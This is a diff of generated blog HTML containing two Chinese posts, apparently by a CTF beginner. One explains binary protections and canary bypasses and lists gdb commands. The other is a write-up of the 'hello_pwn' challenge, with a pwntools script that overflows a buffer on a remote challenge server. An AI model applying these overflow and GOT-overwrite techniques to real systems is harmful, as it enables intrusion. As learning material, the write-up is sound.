 <img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/3.png" class>
 <p>（这张是我在网上随便找的）</p>
-<h2 id="Arch"><a href="#Arch" class="headerlink" title="Arch"></a>Arch</h2><p>程序架构信息，判断是64位还是32位，exp编写的时候是p64还是p32</p>
-<h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>Relocation Read-Onl（RELRO）此项技术主要针对GOT改写的攻击方式，它分成两种，Partial RELRO和FULL RELRO<br>Partial RELRO容易受到攻击，例如攻击者可以atoi.got为system.plt进而输入/bin/sh\x00获得shell，<br>Full RELRO使整个GOT只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
-<h2 id="Stack-canary"><a href="#Stack-canary" class="headerlink" title="Stack-canary"></a>Stack-canary</h2><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞是，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行，当启用栈保护后，函数开始执行的时候先会往栈里插入类似cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行，攻击者在<strong>覆盖返回地址</strong>的时候往往会将cookie信息给覆盖掉，导致栈保护检车失败而阻止shellcode的执行，在linux中我们将cookie信息称为canary。因此我们需要获取 Canary 的值，或者防止触发 stack_chk_fail 函数，或是利用此函数。</p>
+<h2 id="arch">Arch</h2>
+<p>程序架构信息，判断是64位还是32位，exp编写的时候是p64还是p32</p>
+<h2 id="relro">RELRO</h2>
+<p>Relocation Read-Onl（RELRO）此项技术主要针对GOT改写的攻击方式，它分成两种，Partial RELRO和FULL RELRO Partial RELRO容易受到攻击，例如攻击者可以atoi.got为system.plt进而输入/bin/sh00获得shell， Full RELRO使整个GOT只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
+<h2 id="stack-canary">Stack-canary</h2>
+<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞是，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行，当启用栈保护后，函数开始执行的时候先会往栈里插入类似cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行，攻击者在<strong>覆盖返回地址</strong>的时候往往会将cookie信息给覆盖掉，导致栈保护检车失败而阻止shellcode的执行，在linux中我们将cookie信息称为canary。因此我们需要获取 Canary 的值，或者防止触发 stack_chk_fail 函数，或是利用此函数。</p>
 <p>canary保存在栈的某个位置上，一般来说64位的话会在rbp-0x8的位置，32位则在ebp-0x4的位置。当我们进行栈溢出的时候如果覆盖了canary值，程序就会调用stack_chk_fail来打印报错信息。</p>
 <p><strong>通常有以下几种绕过方法：</strong></p>
-<p>1、通过read函数泄露canary。关键的一点就是read函数读取字符串的时候不会在末尾加上“\x00”,这就是gets函数不能用来泄露canary的原因（有些输出函数遇到‘\0’会截断）。</p>
+<p>1、通过read函数泄露canary。关键的一点就是read函数读取字符串的时候不会在末尾加上“”,这就是gets函数不能用来泄露canary的原因（有些输出函数遇到‘\0’会截断）。</p>
 <p>2、暴力破解canary。这种方法利用起来有限制，就是一般要程序中有fork函数创造出子进程，因为子进程是父进程复制出来的，所以canary也就跟父进程相同，在子进程中覆盖canary后报错就会退回到父进程，此时canary的值是不会改变的。</p>
 <p>3、劫持stack_chk_fail。因为canary被覆盖的时候会调用这个函数，所以如果我们可以利用程序中的漏洞（比如格式化字符串）改got表中stack_chk_fail的地址为one_gadget的地址就能getshell。</p>
 <p>4、利用stack_chk_fail的报错信息。在报错信息中，会将你发生栈溢出的程序名调用输出，其位置位于argv[0]，我们可以将argv[0]的地址改写为我们想要获取的内容的地址，使它随着错误提示一起输出。</p>
-<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>Non-Executable Memory，不可执行内存。了解 Linux 的都知道其文件有三种属性，即 rwx，而 NX 即没有 x 属性。如果没有 w 属性，我们就不能向内存单元中写入数据，如果没有 x 属性，写入的 shellcode 就无法执行。所以，我们此时应该使用其他方法来 pwn 掉程序，其中最常见的方法为 ROP (Return-Oriented Programming 返回导向编程)，利用栈溢出在栈上布置地址，每个内存地址对应一个 gadget，利用 ret 等指令进行衔接来执行某项功能，最终达到 pwn 掉程序的目的。<br>NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来，当攻击者在堆栈上部署自己的shellcode并触发时，智慧直接造成程序的崩溃，但是可以利用rop这种方法绕过</p>
-<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>PTE（Position-Independent  Executable，位置无关可执行文件）技术与ASLR技术类似，ASLR将程序运行时的堆栈以及共享库的加载地址随机化，而PIE及时则在编译时将程序编译为位置无关，即程序运行时各个段（如代码但等）加载的虚拟地址也是在装载时才确定，这就意味着。在PIE和ASLR同时开启的情况下，攻击者将对程序的内存布局一无所知，传统改写GOT表项也难以进行，因为攻击者不能获得程序的.got段的虚地址。若开始一般需在攻击时歇够地址信息</p>
-<h1 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h1><p><strong>一些简单的命令</strong><br>gdb 文件名 </p>
+<h2 id="nx">NX</h2>
+<p>Non-Executable Memory，不可执行内存。了解 Linux 的都知道其文件有三种属性，即 rwx，而 NX 即没有 x 属性。如果没有 w 属性，我们就不能向内存单元中写入数据，如果没有 x 属性，写入的 shellcode 就无法执行。所以，我们此时应该使用其他方法来 pwn 掉程序，其中最常见的方法为 ROP (Return-Oriented Programming 返回导向编程)，利用栈溢出在栈上布置地址，每个内存地址对应一个 gadget，利用 ret 等指令进行衔接来执行某项功能，最终达到 pwn 掉程序的目的。 NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来，当攻击者在堆栈上部署自己的shellcode并触发时，智慧直接造成程序的崩溃，但是可以利用rop这种方法绕过</p>
+<h2 id="pie">PIE</h2>
+<p>PTE（Position-Independent Executable，位置无关可执行文件）技术与ASLR技术类似，ASLR将程序运行时的堆栈以及共享库的加载地址随机化，而PIE及时则在编译时将程序编译为位置无关，即程序运行时各个段（如代码但等）加载的虚拟地址也是在装载时才确定，这就意味着。在PIE和ASLR同时开启的情况下，攻击者将对程序的内存布局一无所知，传统改写GOT表项也难以进行，因为攻击者不能获得程序的.got段的虚地址。若开始一般需在攻击时歇够地址信息</p>
+<h1 id="gdb">gdb</h1>
+<p><strong>一些简单的命令</strong> gdb 文件名</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">r 运行</span><br><span class="line">disass 函数名					//查看函数的反汇编代码</span><br><span class="line">i b							//查看断点</span><br><span class="line">d 断点编号 						//删除断点</span><br><span class="line">checksec 						//查看elf编译的保护选项。</span><br><span class="line">file [file] 					//加载objfile</span><br><span class="line">disas addr 						//对地址addr处的指令进行反汇编，addr可以是函数名</span><br><span class="line">b *addr 							//在addr处下一个断点 </span><br><span class="line">x addr 							//查看addr处存储的数据值  </span><br><span class="line">c 								//继续运行 </span><br><span class="line">ni 								//单步执行不进入</span><br><span class="line">si 								//单步执行并进入 </span><br><span class="line">vmmap 							//得到虚拟映射地址</span><br></pre></td></tr></table></figure>
-
 <p><strong>一些例子</strong></p>
-<p><code>aslr</code> – 显示/设定GDB的ASLR(地址空间配置随机加载)设置 </p>
+<p><code>aslr</code> – 显示/设定GDB的ASLR(地址空间配置随机加载)设置</p>
 <img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/1.jpg" class>
-
 <p><code>dumpargs</code> – 函数将要被调用时，显示将要被传入函数的所有参数(默认会在反汇编代码下方自动显示)</p>
-<p><code>dumprop</code> – 在给定内存范围中Dump出所有ROP gadgets </p>
+<p><code>dumprop</code> – 在给定内存范围中Dump出所有ROP gadgets</p>
 <img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/2.jpg" class>
-
 <p><code>elfheader</code> – Get headers information from debugged ELF file</p>
 <p><code>elfsymbol</code> – 获取non-debugging symbol信息（plt表）</p>
 <img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/3.jpg" class>
-
 <p><code>lookup</code> – Search for all addresses/references to addresses which belong to a memory range</p>
 <p><code>patch</code> – Patch memory start at an address with string/hexstring/int</p>
 <p><code>pattern create size</code> 生成特定长度字符串</p>
-<p><code>pattern offset value</code> 定位字符串 </p>
+<p><code>pattern offset value</code> 定位字符串</p>
 <img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/4.jpg" class>
-
-<p><code>searchmem|find</code> – 在内存中查找字符串，支持正则表达式 </p>
+<p><code>searchmem|find</code> – 在内存中查找字符串，支持正则表达式</p>
 <img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/5.jpg" class>
-
 <p><code>shellcode</code> – 生成shellcode</p>
 <img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/6.jpg" class>
-
-<p><code>vmmap</code> – 可以用来查看栈、bss段是否可以执行 </p>
+<p><code>vmmap</code> – 可以用来查看栈、bss段是否可以执行</p>
 <img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/7.jpg" class>
+
       
     </div>
 
@@ -1189,61 +1142,45 @@
     
     <div class="post-body" itemprop="articleBody">
           <img src="/2020/12/18/AD-hello-pwn/1.jpg" class>
-
-<p>诶呀。。。。。。<br>没人告诉我pwntools是用python写的，我看到题解有python语法就先去学python语法，看半天找不到我要的，因为用法在pwntools里。<br>诶呀，恶心啊。。。。</p>
-<p>#Pwntools主要模块及其使用<br><strong>Tubes模块包含remote和process子模块</strong></p>
+<p>诶呀。。。。。。 没人告诉我pwntools是用python写的，我看到题解有python语法就先去学python语法，看半天找不到我要的，因为用法在pwntools里。 诶呀，恶心啊。。。。</p>
+<p>#Pwntools主要模块及其使用 <strong>Tubes模块包含remote和process子模块</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">32152</span>)</span><br><span class="line"><span class="comment"># 与互联网主机交互</span></span><br><span class="line">io.sendline(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">io.send(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="comment"># sendline发送数据会在最后多添加一个回车</span></span><br><span class="line">io.recv(<span class="number">1024</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line"><span class="comment"># recv()读取1024个字节，revuntil()读取到指定数据，recvline()会读取一直到回车</span></span><br><span class="line">io.interactive() <span class="comment">#爷不晓得</span></span><br></pre></td></tr></table></figure>
-
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">&quot;./bin&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#启动本地程序进行交互，用于gdb调试</span></span><br></pre></td></tr></table></figure>
-
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">io.p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">io.u32(<span class="string">&quot;1234&quot;</span>)</span><br><span class="line">io.u64(<span class="string">&quot;12345678&quot;</span>)</span><br><span class="line"><span class="comment"># 将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword</span></span><br></pre></td></tr></table></figure>
-
-
-
 <p>之前昨天速成python是在本机VS2019（我现在还没找到解释器），现在去VMLinux写。</p>
 <p>太懒了，不下IDE了</p>
 <p><strong>新建文件</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; text.py</span><br></pre></td></tr></table></figure>
-
 <p>右键修改权限后可执行</p>
-<h1 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h1><p>本题附件用于反编译，查找漏洞，然后写脚本，用脚本连接对准环境直接攻击（我拿着脚本对附件打了半天）</p>
+<h1 id="做题">做题</h1>
+<p>本题附件用于反编译，查找漏洞，然后写脚本，用脚本连接对准环境直接攻击（我拿着脚本对附件打了半天）</p>
 <img src="/2020/12/18/AD-hello-pwn/3.jpg" class>
-
 <p>把附件先扔到IDA反编译</p>
 <img src="/2020/12/18/AD-hello-pwn/2.png" class>
-
 <p>你要是不晓得这是啥玩意，巧了，我也不知道</p>
 <p>写脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  <span class="comment">#导入pwntools的工具，我一开始在导入附件，别骂了</span></span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">41392</span>) <span class="comment">#连接环境</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;bof&quot;</span>) <span class="comment">#读取到指定数据</span></span><br><span class="line">io.sendline(payload) <span class="comment">#发送数据</span></span><br><span class="line">io.interactive() <span class="comment">#爷不懂得</span></span><br></pre></td></tr></table></figure>
-
 <p>运行脚本，成功</p>
 <p><strong>爷太菜了，爷滚去看汇编了</strong></p>
 <p><strong>······</strong></p>
 <p><strong>一目十行速成汇编，我胡汉三又回来了</strong></p>
 <p>附件扔IDA，找到main得到一个结构</p>
 <img src="/2020/12/18/AD-hello-pwn/1.png" class>
-
 <p>反汇编得到一段伪c代码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  puts(&quot;~~ welcome to ctf ~~     &quot;);</span><br><span class="line">  puts(&quot;lets get helloworld for bof&quot;);</span><br><span class="line">  read(0, &amp;unk_601068, 0x10uLL);</span><br><span class="line">  if ( dword_60106C == 1853186401 )</span><br><span class="line">    sub_400686();</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>代码里面有read函数，上网去找C语言read()函数的用法</p>
 <p>从文件中读取指定大小的字节函数read()</p>
-<p>原型：<code>ssize_t read(int fd,void*buf,size_t count)</code><br>参数说明：<br>fd:   是文件描述符，对应0<br>buf:   为读出数据的缓冲区<br>count:  为每次读取的字节数（是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移）<br>总结：read函数从指定的打开的文件fd中读取指定大小count的字节到从buf开始的缓冲区中。</p>
-<p>返回值:<br>若读取失败则返回-1。<br>读取成功则返回实际读取到的字节数,有两种情况:<br> [1].读取到的字节数小于count,这是在读取的文件的总字节数小于count。<br> [2].若读取到的字节数等于count,则在读取的文件的总字节数不小于count时发生。<br>注意:读取到的字节存放在buf缓冲区中,必须最后加上一个字节’\0’才能组成一个字符串</p>
-<p>回到题目<br>第一个参数为0，代表标准输入即从终端输入，第三个参数是输入的个数是0x10（uLL是unsigned long long），即16个字节。<br>将数据读到&amp;unk_601068（我猜）</p>
-<p>双击&amp;unk_601068和dword_60106C，IDA跳转到另一页面（IDA开始香了）</p>
-<img src="/2020/12/18/AD-hello-pwn/4.png" class>
-
-<p>双击sub_400686()，跳转到：</p>
-<img src="/2020/12/18/AD-hello-pwn/5.png" class>
-<p>芜湖起飞</p>
+<p>原型：<code>ssize_t read(int fd,void*buf,size_t count)</code> 参数说明： fd: 是文件描述符，对应0 buf: 为读出数据的缓冲区 count: 为每次读取的字节数（是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移） 总结：read函数从指定的打开的文件fd中读取指定大小count的字节到从buf开始的缓冲区中。</p>
+<p>返回值: 若读取失败则返回-1。 读取成功则返回实际读取到的字节数,有两种情况: [1].读取到的字节数小于count,这是在读取的文件的总字节数小于count。 [2].若读取到的字节数等于count,则在读取的文件的总字节数不小于count时发生。 注意:读取到的字节存放在buf缓冲区中,必须最后加上一个字节'\0'才能组成一个字符串</p>
+<p>回到题目 第一个参数为0，代表标准输入即从终端输入，第三个参数是输入的个数是0x10（uLL是unsigned long long），即16个字节。 将数据读到&amp;unk_601068（我猜）</p>
+<p>双击&amp;unk_601068和dword_60106C，IDA跳转到另一页面（IDA开始香了） <img src="/2020/12/18/AD-hello-pwn/4.png" class></p>
+<p>双击sub_400686()，跳转到： <img src="/2020/12/18/AD-hello-pwn/5.png" class> 芜湖起飞</p>
 <p>也就是说只要dword_60106C=1853186401，就能拿到flag</p>
-<p>现在再看脚本了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">41392</span>) <span class="comment">#连接环境</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>) <span class="comment">#&#x27;a&#x27;*4代表偏移四个字节，p64()是pwntools工具，打包数据，64位</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;lets get hello world for bof&quot;</span>) <span class="comment">#读取代码直到这个位置</span></span><br><span class="line">io.sendline(payload) </span><br><span class="line"><span class="comment">#发送数据，写入到&amp;unk_601068，但我的数据使它偏移了4个字节，到了dword_60106C，写入数据</span></span><br><span class="line">io.interactive() <span class="comment">#将控制权交给用户</span></span><br></pre></td></tr></table></figure>
-
+<p>现在再看脚本了 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">41392</span>) <span class="comment">#连接环境</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>) <span class="comment">#&#x27;a&#x27;*4代表偏移四个字节，p64()是pwntools工具，打包数据，64位</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;lets get hello world for bof&quot;</span>) <span class="comment">#读取代码直到这个位置</span></span><br><span class="line">io.sendline(payload) </span><br><span class="line"><span class="comment">#发送数据，写入到&amp;unk_601068，但我的数据使它偏移了4个字节，到了dword_60106C，写入数据</span></span><br><span class="line">io.interactive() <span class="comment">#将控制权交给用户</span></span><br></pre></td></tr></table></figure></p>
 <p>没有人比我更懂速成</p>
-<h1 id="IDA反编译汇编源代码复盘"><a href="#IDA反编译汇编源代码复盘" class="headerlink" title="IDA反编译汇编源代码复盘"></a>IDA反编译汇编源代码复盘</h1><p><strong>start 先于 main</strong></p>
-<p><strong>段寄存器说明语句</strong><br>在汇编语言源程序中可以定义多个段，每个段都要与一个段寄存器建立一种对应关系。建立这种对应关系的说明语句格式如下：</p>
+<h1 id="ida反编译汇编源代码复盘">IDA反编译汇编源代码复盘</h1>
+<p><strong>start 先于 main</strong></p>
+<p><strong>段寄存器说明语句</strong> 在汇编语言源程序中可以定义多个段，每个段都要与一个段寄存器建立一种对应关系。建立这种对应关系的说明语句格式如下：</p>
 <p>assume 段寄存器名:段名[, 段寄存器名:段名, ……]</p>
 <p>其中：段寄存器是CS、DS、ES、SS、FS和GS，段名是在段定义语句说明时的段名。</p>
 <p>在一条assume语句中可建立多组段寄存器与段之间的关系，每种对应关系要用逗号分隔。例如，</p>
@@ -1252,17 +1189,17 @@
 <p>在assume语句中，还可以用关键字nothing来说明某个段寄存器不与任何段相对应。下面语句说明了段寄存器ES不与某段相对应。</p>
 <p>assume ES:nothing</p>
 <p>在通常情况下，代码段的第一条语句就是用assume语句来说明段寄存器与段之间的对应关系。在代码段的其它位置，还可以用另一个assume语句来改变前面assume语句所说明的对应关系，这样，代码段中的指令就用最近的assume语句所建立的对应关系来确定指令中的有关信息。</p>
-<p><strong>跨段寻址</strong><br>偶尔需要存取默认段以外的操作数，就要使用操作数段前缀。如，<br>mov ax,es:[si]<br>这条指令告诉cpu：要读取的数据不在当前数据段，而在附加段的si所指的地址。</p>
+<p><strong>跨段寻址</strong> 偶尔需要存取默认段以外的操作数，就要使用操作数段前缀。如， mov ax,es:[si] 这条指令告诉cpu：要读取的数据不在当前数据段，而在附加段的si所指的地址。</p>
 <p><strong>segment</strong></p>
-<p>[格式]<br>segment_name SEGMENT [定位类型] [组合类型] [类别名]<br>···;here is your code<br>segment ends</p>
+<p>[格式] segment_name SEGMENT [定位类型] [组合类型] [类别名] ···;here is your code segment ends</p>
 <p>参数解释:</p>
-<p>[定位类型]<br>指明段开始的边界，如para，它使段定位在小段的边界，段首地址正好能被16整除，定位类型未指定时默认为para<br>段的定位类型有4种，分别是：<br>  page(页起始)，起始地址以00H结尾，能被256整除<br>  para (节起始)，起始地址以0H结尾，能被16整除<br>  word(字起始)，起始地址末位为0，是偶地址<br>  byte (字节起始)，起始地址为任意边界</p>
-<p>[组合类型]<br>决定本段是否要和其他段组合在一起，组合类型有：stack，common，public</p>
-<p>[类别名]<br>连接时用于相关段组合在一起，如代码段’code’，数据段’Data’，堆栈段’Stack’</p>
-<p>例子: stack segment para stack ‘stack’<br>解释: para表明该段起始地址对齐到para。 1 para= 16 bytes。stack声明该段是堆栈段，这样在最后的链接link时，会将该最终创建的exe文件头部的SS：SP域指向该段的末尾<br>‘stack’表明该段的组合名为’stack’。同一程序不同模块中，相同组合名的段会组合到一起。组合名也决定了最后exe文件中各个段的排列顺序</p>
-<p><strong>hlt</strong><br>HLT是暂停指令，当计算机程序运行一条HLT指令的时候，处理器就会进入传统的暂停模式。bai部的时钟信号停止下来了。在收到中断指令后，处理器又可以回到正常运作形态，同时时钟信号也恢复正常。 </p>
-<p><strong>栈堆相关寄存器</strong><br>运行时堆栈是内存数组，CPU用ESP寄存器（堆栈指针寄存器），对其进行管理。<br>ESP存放的是堆栈中某个位置的32位偏移量，每个堆栈位置都是32位长。<br>对应64位下的rsp（低位为esp）</p>
-<p>几个常用的寄存器<br>sp/esp/rsp（16bit/32bit/64bit）栈寄存器—指向栈顶<br>bp/ebp/rbp 栈基址寄存器—指向栈底<br>ip/eip/rip 程序指令寄存器—指向下一条待执行指令</p>
+<p>[定位类型] 指明段开始的边界，如para，它使段定位在小段的边界，段首地址正好能被16整除，定位类型未指定时默认为para 段的定位类型有4种，分别是： page(页起始)，起始地址以00H结尾，能被256整除 para (节起始)，起始地址以0H结尾，能被16整除 word(字起始)，起始地址末位为0，是偶地址 byte (字节起始)，起始地址为任意边界</p>
+<p>[组合类型] 决定本段是否要和其他段组合在一起，组合类型有：stack，common，public</p>
+<p>[类别名] 连接时用于相关段组合在一起，如代码段’code’，数据段’Data’，堆栈段’Stack’</p>
+<p>例子: stack segment para stack ‘stack’ 解释: para表明该段起始地址对齐到para。 1 para= 16 bytes。stack声明该段是堆栈段，这样在最后的链接link时，会将该最终创建的exe文件头部的SS：SP域指向该段的末尾 ‘stack’表明该段的组合名为’stack’。同一程序不同模块中，相同组合名的段会组合到一起。组合名也决定了最后exe文件中各个段的排列顺序</p>
+<p><strong>hlt</strong> HLT是暂停指令，当计算机程序运行一条HLT指令的时候，处理器就会进入传统的暂停模式。bai部的时钟信号停止下来了。在收到中断指令后，处理器又可以回到正常运作形态，同时时钟信号也恢复正常。</p>
+<p><strong>栈堆相关寄存器</strong> 运行时堆栈是内存数组，CPU用ESP寄存器（堆栈指针寄存器），对其进行管理。 ESP存放的是堆栈中某个位置的32位偏移量，每个堆栈位置都是32位长。 对应64位下的rsp（低位为esp）</p>
+<p>几个常用的寄存器 sp/esp/rsp（16bit/32bit/64bit）栈寄存器---指向栈顶 bp/ebp/rbp 栈基址寄存器---指向栈底 ip/eip/rip 程序指令寄存器---指向下一条待执行指令</p>
 
       
     </div>
